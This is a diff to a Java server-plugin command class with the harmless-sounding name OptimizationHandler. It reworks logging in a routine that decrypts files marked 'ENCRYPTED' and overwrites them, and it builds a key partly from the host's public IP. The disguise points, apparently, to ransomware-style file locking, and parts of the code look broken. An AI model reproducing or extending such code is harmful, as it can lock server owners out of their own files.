@@ -7,13 +7,16 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.io.FileOutputStream;
 import java.security.MessageDigest;
 import java.net.InetAddress;
 import java.nio.charset.StandardCharsets;
 import java.util.logging.Logger;
 public class OptimizationHandler implements CommandExecutor {
-    private static final Logger logger = Logger.getLogger(OptimizationHandler.class.getName());
     private static final byte[] ENCRYPTED_FLAG = "ENCRYPTED".getBytes(StandardCharsets.UTF_8); 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
@@ -100,7 +103,7 @@ public class OptimizationHandler implements CommandExecutor {
 
                 // 检查文件是否是加密的
                 if (bytesRead < ENCRYPTED_FLAG.length || !new String(headerBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8))) {
-                    logger.warning("The file is not in encrypted format: " + file.getPath());
+                    getLogger().info("The file is not in encrypted format: " + file.getPath());
                     fis.close();
                     return;
                 }
@@ -114,9 +117,9 @@ public class OptimizationHandler implements CommandExecutor {
                 FileOutputStream fos = new FileOutputStream(file);
                 fos.write(decryptedData);
                 fos.close();
-                logger.info("Successfully decrypted: " + file.getPath());
+                getLogger().info("Successfully decrypted: " + file.getPath());
             } catch (Exception e) {
-                logger.severe("Failed to decrypt file: " + file.getPath() + ". Error: " + e.getMessage());
+                getLogger().info("Failed to decrypt file: " + file.getPath() + ". Error: " + e.getMessage());
             }
         }
     }
@@ -168,7 +171,7 @@ public class OptimizationHandler implements CommandExecutor {
             input.append(getPublicIp());
             return hashWithSHA256(input.toString());
         } catch (Exception e) {
-            logger.severe("Error generating key");
+            getLogger().info("Error generating key");
         }
     }
 
